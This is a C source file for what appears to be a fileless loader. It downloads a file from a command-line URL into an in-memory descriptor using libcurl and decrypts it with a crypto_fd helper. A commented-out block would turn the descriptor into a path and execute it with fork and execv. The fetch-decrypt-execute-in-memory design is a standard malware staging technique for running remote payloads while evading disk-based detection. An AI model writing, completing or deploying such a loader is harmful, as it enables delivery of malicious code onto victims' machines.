#define _GNU_SOURCE
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/wait.h>

#include <errno.h>
#include <unistd.h>

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <stdint.h>
#include <string.h>

#include <curl/curl.h>

#include "errors.h"
#include "common.h"

size_t write_callback(void* data, size_t size, size_t nmemb, void* userp) {
  ssize_t written = write(*(int*)userp, data, nmemb * size);
  PERROR_IF(written == -1, "[!] Cannot write file chunk to memory");
  return written;
}

int download_to_fd(char* url) {
  int fd = create_mem_fd();

  CURL* curl = curl_easy_init();
  ERROR_IF(curl == NULL, "[!] Cannot create CURL object");

  curl_easy_setopt(curl, CURLOPT_URL, url);
  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
  curl_easy_setopt(curl, CURLOPT_WRITEDATA, &fd);

  CURLcode res = curl_easy_perform(curl);
  ERROR_IF(res != CURLE_OK, "[!] Download failed");

  long server_code = 0;
  curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &server_code);
  ERROR_IF(server_code != 200, "[!] Server returned error %d", (int)server_code);

  curl_easy_cleanup(curl);
  return fd;
}

void exec_file(char* path, char* argv[]) {
  int pid = fork();
  PERROR_IF(pid == -1, "[!] Cannot fork");

  if (pid == 0) {  // Child process
    printf("[+] Child started:\n");
    PERROR_IF(execv(path, argv) == -1, "[!] Calling execv failed");

  } else {  // Parent process
    int status = 0;
    PERROR_IF(waitpid(pid, &status, 0) == -1, "[!] Cannot call waitpid on child process");

    if (WIFEXITED(status)) {
      printf("[-] Child process %d terminated normally with code %d\n", pid, WEXITSTATUS(status));

    } else if (WIFSIGNALED(status)) {
      printf("[-] Child process %d terminated by signal %d\n", pid, WTERMSIG(status));
    }
  }
}

int main(int argc, char* argv[]) {
  if (argc != 2) {
    printf("[!] No URL specified\n");
    return -1;
  }

  int download_fd    = download_to_fd(argv[1]);
  int decrypted_file = crypto_fd(download_fd, false);

  /*char* download_path  = fd_to_path(download_fd);
  char* running_argv[] = {download_path, NULL};

  exec_file(download_path, running_argv);

  free(download_path);
  close(download_fd);*/

  return 0;
}
